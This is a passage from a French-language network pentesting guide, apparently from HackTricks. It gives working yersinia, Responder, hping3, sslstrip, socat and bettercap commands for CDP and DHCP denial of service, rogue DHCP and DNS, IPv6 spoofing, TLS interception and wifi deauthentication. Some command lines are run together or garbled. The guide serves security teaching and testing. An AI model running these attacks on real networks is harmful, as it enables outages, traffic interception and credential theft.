Le protocole de d√©couverte CISCO (CDP) est le protocole utilis√© par les appareils CISCO pour communiquer entre eux, **d√©couvrir qui est en vie** et quelles sont leurs fonctionnalit√©s.

#### Collecte d'informations <a href="#0e0f" id="0e0f"></a>

**Par d√©faut, le CDP envoie des annonces √† tous ses ports.** Mais que se passe-t-il si un intrus se connecte √† un port sur le m√™me commutateur ? En utilisant un sniffer r√©seau, que ce soit **Wireshark**, **tcpdump** ou **Yersinia**, il pourrait extraire **des informations pr√©cieuses sur l'appareil lui-m√™me**, depuis son mod√®le jusqu'√† la version de Cisco IOS. En utilisant ces informations, il sera en mesure d'√©num√©rer la m√™me version de Cisco IOS et de trouver la vuln√©rabilit√© pour ensuite l'exploiter.

#### Attaque de saturation CDP <a href="#0d6a" id="0d6a"></a>

Vous pouvez effectuer une attaque DoS sur un commutateur CISCO en √©puisant la m√©moire de l'appareil en simulant de vrais appareils CISCO.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
S√©lectionnez l'option **tableau de saturation CDP** et lancez l'attaque. Le CPU du commutateur sera surcharg√©, ainsi que la table des voisins CDP, **entra√Ænant une "paralysie du r√©seau".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaque d'usurpation CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez √©galement utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP

Bien que destin√©s √† √™tre utilis√©s par les t√©l√©phones Voice over Internet Protocol (VoIP) des employ√©s, les dispositifs VoIP modernes sont de plus en plus int√©gr√©s aux dispositifs IoT. De nombreux employ√©s peuvent d√©sormais d√©verrouiller des portes √† l'aide d'un num√©ro de t√©l√©phone sp√©cial, contr√¥ler le thermostat de la pi√®ce...

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) imite le comportement d'un t√©l√©phone VoIP dans les environnements Cisco, Avaya, Nortel et Alcatel-Lucent. Il d√©couvre automatiquement l'ID de VLAN correct pour le r√©seau vocal en utilisant l'un des protocoles de d√©couverte de p√©riph√©rique qu'il prend en charge, tels que le protocole de d√©couverte Cisco (CDP), le protocole de configuration dynamique des h√¥tes (DHCP), le protocole de d√©couverte de couche de liaison (LLDP-MED) et 802.1Q ARP.

**VoIP Hopper** prend en charge **trois** modes CDP. Le mode **sniff** inspecte les paquets r√©seau et tente de localiser l'ID de VLAN. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur `0`. Le mode **spoof** g√©n√®re des paquets personnalis√©s similaires √† ceux qu'un v√©ritable dispositif VoIP transmettrait dans le r√©seau d'entreprise. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur **`1`**. Le mode de spoofing avec un paquet **pr√©fabriqu√©** envoie les m√™mes paquets qu'un t√©l√©phone IP Cisco 7971G-GE. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur **`2`**.

Nous utilisons la derni√®re m√©thode car c'est l'approche la plus rapide. Le param√®tre **`-i`** sp√©cifie l'**interface r√©seau** de l'attaquant, et le param√®tre **`-E`** sp√©cifie le **nom du dispositif VOIP** qui est imit√©. Nous avons choisi le nom SEP001EEEEEEEEE, qui est compatible avec le format de nommage Cisco pour les t√©l√©phones VoIP. Le format se compose du mot "SEP" suivi d'une adresse MAC. Dans les environnements d'entreprise, vous pouvez imiter un dispositif VoIP existant en regardant l'√©tiquette MAC √† l'arri√®re du t√©l√©phone ; en appuyant sur le bouton Param√®tres et en s√©lectionnant l'option Informations sur le mod√®le sur l'√©cran d'affichage du t√©l√©phone ; ou en connectant le c√¢ble Ethernet du dispositif VoIP √† votre ordinateur portable et en observant les demandes CDP du dispositif √† l'aide de Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si l'outil s'ex√©cute avec succ√®s, le **r√©seau VLAN attribuera une adresse IPv4 √† l'appareil de l'attaquant**.

### Attaques DHCP

#### √ânum√©ration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Il existe deux types de DoS qui peuvent √™tre effectu√©s contre les serveurs DHCP. Le premier consiste √† **simuler suffisamment de fausses machines pour utiliser toutes les adresses IP possibles**.
Cette attaque ne fonctionnera que si vous pouvez voir les r√©ponses du serveur DHCP et terminer le protocole (**D√©couverte** (Comp) --> **Offre** (serveur) --> **Demande** (Comp) --> **ACK** (serveur)). Par exemple, cela **n'est pas possible dans les r√©seaux Wifi**.

Une autre fa√ßon de r√©aliser un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant chaque adresse IP possible comme code source**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'adresse IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une fa√ßon plus automatique de le faire est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pouvez utiliser les attaques DoS mentionn√©es pour forcer les clients √† obtenir de nouvelles adresses dans l'environnement, et √©puiser les serveurs l√©gitimes afin qu'ils deviennent non r√©actifs. Ainsi, lorsque les l√©gitimes tentent de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionn√©es dans la prochaine attaque**.

#### D√©finir des valeurs malveillantes

Vous pouvez utiliser le script DHCP de Responder (_/usr/share/responder/DHCP.py_) pour √©tablir un serveur DHCP pirate. D√©finir une passerelle malveillante n'est pas id√©al, car la connexion d√©tourn√©e est seulement semi-duplex (c'est-√†-dire que nous capturons les paquets de sortie du client, mais pas les r√©ponses de la passerelle l√©gitime). Par cons√©quent, je recommanderais de d√©finir un serveur DNS ou WPAD pirate pour capturer le trafic HTTP et les informations d'identification en particulier.

| Description                                 | Exemple                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Notre adresse IP, annonc√©e comme passerelle | _-i 10.0.0.100_                                                              |
| Le nom de domaine DNS local (facultatif)     | _-d example.org_                                                             |
| Adresse IP du routeur/passerelle d'origine   | _-r 10.0.0.1_                                                                |
| Adresse IP du serveur DNS principal          | _-p 10.0.0.100_                                                              |
| Adresse IP du serveur DNS secondaire (facultatif) | _-s 10.0.0.1_                                                             |
| Le masque de sous-r√©seau du r√©seau local     | _-n 255.255.255.0_                                                           |
| L'interface sur laquelle √©couter le trafic DHCP | _-I eth1_                                                                  |
| Adresse de configuration WPAD (URL)          | _-w ‚Äú_[http://10.0.0.100/wpad.dat\n‚Äù](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Spoof l'adresse IP de la passerelle par d√©faut | -S                                                                           |
| R√©pondre √† toutes les demandes DHCP (tr√®s bruyant) | -R                                                                           |

### **Attaques EAP**

Voici quelques tactiques d'attaque qui peuvent √™tre utilis√©es contre les impl√©mentations 802.1X :

* Brute-force actif de mot de passe via EAP
* Attaque du serveur RADIUS avec un contenu EAP malform√© _\*\*_(exploits)
* Capture de messages EAP et craquage hors ligne de mots de passe (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic r√©seau malveillant lors de l'authentification √† l'aide d'un concentrateur ou similaire

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il peut essayer de d√©grader (si n√©cessaire) le protocole d'authentification en EAP-MD5 et capturer la tentative d'authentification. Ensuite, il peut effectuer une attaque de force brute en utilisant :
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles r√©seau con√ßus pour **cr√©er un syst√®me de routage redondant √† chaud**. Avec FHRP, les routeurs physiques peuvent √™tre combin√©s en un seul dispositif logique, ce qui augmente la tol√©rance aux pannes et aide √† r√©partir la charge.

**Les ing√©nieurs de Cisco Systems ont d√©velopp√© deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Il existe trois versions du protocole de routage RIP (Routing Information Protocol) - RIP, RIPv2 et RIPng. RIP et RIPv2 utilisent des datagrammes UDP envoy√©s aux pairs via le port 520, tandis que RIPng diffuse des datagrammes vers le port UDP 521 via le multicast IPv6. RIPv2 a introduit la prise en charge de l'authentification MD5. RIPng n'int√®gre pas d'authentification native ; il repose plut√¥t sur les en-t√™tes IPsec AH et ESP optionnels dans IPv6.

Pour plus d'informations sur la fa√ßon d'attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3rd edition).**_

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole de vecteur de distance.** Si **aucune authentification** et configuration des interfaces passives n'est effectu√©e, un **intrus** peut interf√©rer avec le routage EIGRP et provoquer **l'empoisonnement des tables de routage**. De plus, le r√©seau EIGRP (autrement dit, le syst√®me autonome) **est plat et n'est pas segment√© en zones**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le syst√®me autonome EIGRP.

Pour attaquer un syst√®me EIGRP, il est n√©cessaire d'**√©tablir une relation de voisinage avec un routeur EIGRP l√©gitime**, ce qui ouvre de nombreuses possibilit√©s, de la reconnaissance de base √† diverses injections.

\*\*\*\*[**FRRouting**](https://frrouting.org/) vous permet de mettre en place **un routeur virtuel prenant en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Il vous suffit de le d√©ployer sur votre syst√®me d'attaquant et vous pouvez pr√©tendre √™tre un routeur l√©gitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) prend √©galement en charge la capture des diffusions EIGRP et l'injection de paquets pour manipuler la configuration de routage. Pour plus d'informations sur la fa√ßon de l'attaquer avec Coly, consultez le livre _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

La plupart des impl√©mentations d'Open Shortest Path First (OSPF) utilisent MD5 pour fournir une authentification entre les routeurs. Loki et John the Ripper peuvent capturer et attaquer les hachages MD5 pour r√©v√©ler la cl√©, qui peut ensuite √™tre utilis√©e pour annoncer de nouvelles routes. Les param√®tres de routage sont d√©finis en utilisant l'onglet _Injection_, et la cl√© est d√©finie sous _Connection_.

Pour plus d'informations sur la fa√ßon d'attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3rd edition).**_

### Autres outils et sources g√©n√©riques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour analyser le trafic r√©seau et trouver des vuln√©rabilit√©s
* Vous pouvez trouver plus d'informations sur les attaques r√©seau [ici](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Tout lire et toutes les nouvelles attaques, le cas √©ch√©ant)_

## **Spoofing**

L'attaquant configure tous les param√®tres r√©seau (GW, IP, DNS) du nouveau membre du r√©seau en envoyant de fausses r√©ponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

V√©rifiez la [section pr√©c√©dente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste √† envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une adresse IP. Ensuite, lorsque la victime souhaite contacter l'adresse IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant va r√©soudre certains (ou tous) les domaines demand√©s par la victime.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**

L'utilisation d'un serveur DNS local peut √™tre b√©n√©fique lors de tests de p√©n√©tration r√©seau, car cela permet de contr√¥ler les r√©solutions DNS et de rediriger le trafic vers des adresses IP sp√©cifiques. Dnsmasq est un outil populaire pour configurer un serveur DNS local.

Voici les √©tapes pour configurer votre propre DNS avec dnsmasq :

1. **Installation de dnsmasq** : Tout d'abord, installez dnsmasq sur votre syst√®me. Vous pouvez le faire en utilisant la commande suivante :

   ```
   sudo apt-get install dnsmasq
   ```

2. **Configuration de dnsmasq** : Une fois install√©, ouvrez le fichier de configuration de dnsmasq en utilisant la commande suivante :

   ```
   sudo nano /etc/dnsmasq.conf
   ```

   Dans ce fichier, vous pouvez sp√©cifier les r√©solutions DNS personnalis√©es en utilisant la syntaxe suivante :

   ```
   address=/domaine.com/adresse_IP
   ```

   Par exemple, pour rediriger toutes les requ√™tes DNS pour "domaine.com" vers l'adresse IP "192.168.1.100", vous pouvez ajouter la ligne suivante :

   ```
   address=/domaine.com/192.168.1.100
   ```

   Vous pouvez ajouter autant de r√©solutions DNS personnalis√©es que n√©cessaire.

3. **Red√©marrage de dnsmasq** : Une fois que vous avez termin√© de configurer dnsmasq, red√©marrez le service pour appliquer les modifications en utilisant la commande suivante :

   ```
   sudo service dnsmasq restart
   ```

   Assurez-vous que le service d√©marre correctement et qu'il n'y a pas d'erreurs dans les journaux.

4. **Configuration du DNS local** : Enfin, configurez votre syst√®me pour utiliser le serveur DNS local. Vous pouvez le faire en modifiant le fichier de configuration du r√©seau ou en utilisant l'interface graphique de votre syst√®me d'exploitation.

   - Pour modifier le fichier de configuration du r√©seau, ouvrez le fichier `/etc/resolv.conf` en utilisant la commande suivante :

     ```
     sudo nano /etc/resolv.conf
     ```

     Ajoutez la ligne suivante pour sp√©cifier l'adresse IP de votre serveur DNS local :

     ```
     nameserver 127.0.0.1
     ```

   - Pour utiliser l'interface graphique, recherchez les param√®tres r√©seau de votre syst√®me d'exploitation et sp√©cifiez l'adresse IP de votre serveur DNS local.

Une fois que vous avez configur√© votre propre DNS avec dnsmasq, vous pouvez contr√¥ler les r√©solutions DNS et rediriger le trafic vers des adresses IP sp√©cifiques pour effectuer des tests de p√©n√©tration r√©seau plus avanc√©s.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Il existe souvent plusieurs routes vers des syst√®mes et des r√©seaux. Apr√®s avoir √©tabli une liste d'adresses MAC dans le r√©seau local, utilisez _gateway-finder.py_ pour identifier les h√¥tes qui prennent en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Falsification de LLMNR, NBT-NS et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les syst√®mes Microsoft utilisent Link-Local Multicast Name Resolution (LLMNR) et le service de noms NetBIOS (NBT-NS) pour la r√©solution locale des h√¥tes lorsque les recherches DNS √©chouent. Les impl√©mentations Apple Bonjour et Linux zero-configuration utilisent Multicast DNS (mDNS) pour d√©couvrir les syst√®mes au sein d'un r√©seau. Ces protocoles ne sont pas authentifi√©s et diffusent des messages via UDP ; ainsi, les attaquants peuvent les exploiter pour rediriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par les h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsification de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

De nombreux navigateurs utilisent Web Proxy Auto-Discovery (WPAD) pour charger les param√®tres de proxy depuis le r√©seau. Un serveur WPAD fournit les param√®tres de proxy client via une URL sp√©cifique (par exemple, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) lorsqu'il est identifi√© par l'une des m√©thodes suivantes :

* DHCP, en utilisant une entr√©e de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, en recherchant le nom d'h√¥te _wpad_ dans le domaine local
* Microsoft LLMNR et NBT-NS (en cas d'√©chec de la recherche DNS)

Responder automatise l'attaque WPAD - en ex√©cutant un proxy et en redirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsification de SSDP et des p√©riph√©riques UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez proposer diff√©rents services sur le r√©seau pour essayer de **tromper un utilisateur** afin qu'il entre des **informations d'identification en texte clair**. **Plus d'informations sur cette attaque dans** [**Falsification de SSDP et des p√©riph√©riques UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Falsification de voisin IPv6

Cette attaque est tr√®s similaire √† l'ARP Spoofing mais dans le monde IPv6. Vous pouvez faire croire √† la victime que l'IPv6 de la passerelle a l'adresse MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding des annonces de routeur IPv6

Certains syst√®mes d'exploitation configurent par d√©faut la passerelle √† partir des paquets RA envoy√©s dans le r√©seau. Pour d√©clarer l'attaquant en tant que routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Par d√©faut, certains syst√®mes d'exploitation tentent de configurer le DNS en lisant un paquet DHCPv6 dans le r√©seau. Ainsi, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer en tant que serveur DNS. Le DHCP fournit √©galement une adresse IPv6 √† la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fausse page et injection de code JS)

## Attaques Internet

### sslStrip

Essentiellement, cette attaque consiste √† ce que, dans le cas o√π l'**utilisateur** tente d'**acc√©der** √† une page **HTTP** qui se **redirige** vers la version **HTTPS**, **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur**, ce qui lui permettra de **capturer** la connexion en **texte clair**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'informations [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **diff√©rence** entre **sslStrip+ et dns2proxy** par rapport √† **sslStrip** est qu'ils vont **rediriger** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **"w"** suppl√©mentaire) et d√©finiront l'**adresse de ce domaine comme l'adresse IP de l'attaquant**. De cette fa√ßon, le **client** se **connectera** √† _**wwww.facebook.com**_ **(l'attaquant)** mais en r√©alit√© **sslstrip+** maintiendra la **v√©ritable connexion** via https avec **www.facebook.com**.

L'**objectif** de cette technique est de **contourner HSTS** car _**wwww**.facebook.com_ **ne sera pas** enregistr√© dans le **cache** du navigateur, de sorte que le navigateur sera tromp√© pour effectuer **l'authentification Facebook en HTTP**.\
Notez que pour effectuer cette attaque, la victime doit essayer d'acc√©der initialement √† [http://www.faceook.com](http://www.faceook.com) et non √† https. Cela peut √™tre fait en modifiant les liens √† l'int√©rieur d'une page http.

Plus d'informations [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionne plus. Cela est d√ª aux r√®gles HSTS pr√©enregistr√©es dans les navigateurs, donc m√™me si c'est la premi√®re fois qu'un utilisateur acc√®de √† un domaine "important", il y acc√©dera via HTTPS. De plus, notez que les r√®gles pr√©enregistr√©es et les autres r√®gles g√©n√©r√©es peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple pr√©c√©dent de** _**wwww.facebook.com**_ **ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## √âcoute TCP sur le port
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## √âcoute TCP + SSL sur le port

#### G√©n√©rer des cl√©s et un certificat auto-sign√©
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### √âcoute en utilisant un certificat

L'√©coute en utilisant un certificat est une technique couramment utilis√©e lors des tests de p√©n√©tration pour intercepter et analyser le trafic r√©seau chiffr√©. Cette m√©thode implique la cr√©ation d'un certificat SSL/TLS valide pour le domaine cible, puis la configuration d'un proxy pour intercepter le trafic en utilisant ce certificat.

Voici les √©tapes g√©n√©rales pour effectuer une √©coute en utilisant un certificat :

1. **G√©n√©ration du certificat** : Utilisez des outils tels que OpenSSL pour g√©n√©rer un certificat SSL/TLS valide pour le domaine cible. Assurez-vous de configurer correctement les param√®tres du certificat, tels que le nom commun (CN) et les extensions.

2. **Configuration du proxy** : Configurez un proxy, tel que Burp Suite, pour intercepter le trafic r√©seau. Importez le certificat g√©n√©r√© √† l'√©tape pr√©c√©dente dans le proxy.

3. **Installation du certificat** : Installez le certificat g√©n√©r√© sur le syst√®me cible. Cela peut n√©cessiter l'ajout du certificat √† la liste des autorit√©s de confiance ou √† la liste des certificats du navigateur.

4. **Redirection du trafic** : Configurez le syst√®me cible pour rediriger le trafic vers le proxy. Cela peut √™tre fait en modifiant les param√®tres du proxy dans le navigateur ou en utilisant des techniques de redirection de trafic, telles que l'ARP spoofing.

5. **Analyse du trafic** : Une fois que le trafic est redirig√© vers le proxy, vous pouvez l'analyser √† l'aide d'outils tels que Wireshark. Cela vous permet de visualiser et d'inspecter le trafic r√©seau chiffr√©, y compris les requ√™tes et les r√©ponses.

Il est important de noter que l'√©coute en utilisant un certificat n√©cessite une connaissance approfondie des protocoles SSL/TLS et des outils de proxy. De plus, cette technique doit √™tre utilis√©e de mani√®re √©thique et l√©gale, avec le consentement appropri√© du propri√©taire du syst√®me cible.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### √âcouter en utilisant un certificat et rediriger vers les h√¥tes

Lors de l'audit d'un r√©seau, il est souvent n√©cessaire d'√©couter le trafic r√©seau pour identifier les vuln√©rabilit√©s potentielles. Une m√©thode courante consiste √† utiliser un certificat pour intercepter le trafic chiffr√© et le rediriger vers des h√¥tes sp√©cifiques.

Voici les √©tapes g√©n√©rales pour mettre en place cette m√©thode :

1. G√©n√©rez un certificat SSL valide pour le domaine que vous souhaitez √©couter.
2. Configurez un proxy inverse pour intercepter le trafic HTTPS entrant.
3. Installez le certificat sur le proxy inverse afin qu'il puisse d√©chiffrer le trafic.
4. Configurez le proxy inverse pour rediriger le trafic d√©chiffr√© vers les h√¥tes cibles.

Une fois que tout est configur√©, le proxy inverse interceptera le trafic HTTPS, d√©chiffrera les donn√©es √† l'aide du certificat et redirigera le trafic vers les h√¥tes sp√©cifi√©s. Cela vous permettra d'analyser le trafic en clair et d'identifier les √©ventuelles vuln√©rabilit√©s ou fuites d'informations.

Il est important de noter que cette m√©thode doit √™tre utilis√©e avec pr√©caution et dans le cadre d'un audit de s√©curit√© autoris√©. L'interception du trafic HTTPS sans autorisation appropri√©e peut √™tre ill√©gale et violer la confidentialit√© des utilisateurs.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client v√©rifie que le CA est valide, vous pouvez **servir un certificat d'un autre nom d'h√¥te sign√© par un CA**.\
Un autre test int√©ressant consiste √† servir un **certificat du nom d'h√¥te demand√© mais auto-sign√©**.

D'autres choses √† tester sont de tenter de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou d'utiliser la cl√© publique valide, forcer l'utilisation d'un algorithme comme diffie hellman (qui n'a pas besoin de d√©crypter quoi que ce soit avec la vraie cl√© priv√©e) et lorsque le client demande une sonde de la vraie cl√© priv√©e (comme un hash), envoyer une fausse sonde et esp√©rer que le client ne v√©rifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de d√©couverte active

Il faut prendre en compte que lorsqu'un paquet UDP est envoy√© √† un appareil qui n'a pas le port demand√©, un ICMP (Port Unreachable) est renvoy√©.

### **D√©couverte ARP**

Les paquets ARP sont utilis√©s pour d√©couvrir quelles adresses IP sont utilis√©es dans le r√©seau. Le PC doit envoyer une demande pour chaque adresse IP possible et seules celles qui sont utilis√©es r√©pondront.

### **mDNS (multicast DNS)**

Bettercap envoie une requ√™te mDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet r√©pond g√©n√©ralement √† cette demande. Ensuite, il ne recherche que les machines r√©pondant aux "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap diffuse des paquets vers le port 137/UDP en demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap diffuse des paquets SSDP √† la recherche de tous types de services (port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap diffuse des paquets WSD √† la recherche de services (port UDP 3702).

## R√©f√©rences

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce pour les primes de bug** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **prime de bug cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous voulez voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
